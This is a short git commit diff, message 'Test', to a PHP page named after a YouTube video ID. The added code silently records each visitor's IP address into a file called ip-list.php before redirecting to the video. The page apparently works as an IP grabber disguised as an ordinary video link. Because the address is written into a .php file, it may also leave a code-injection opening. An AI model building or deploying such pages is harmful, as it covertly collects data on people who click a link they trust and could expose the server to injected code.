de53696bd3c45dacacf73e76ecc0ac1321dd8a04
Tucker Alexander <tuckergalexander@gmail.com>
2018-04-09 00:22:29 -0600

    Test

--- njos57IJf-0.php
+++ njos57IJf-0.php
@@ -8,7 +8,10 @@ function getIpAddress() {
         return $_SERVER['REMOTE_ADDR'];
     }
 }
-echo getIpAddress();
+$myfile = fopen("ip-list.php", "w");
+$clientIp = getIpAddress() . PHP_EOL;
+fwrite($myfile, $clientIp);
+fclose($myfile);
 header("Location: https://www.youtube.com/watch?v=njos57IJf-0");
 die();
 ?>
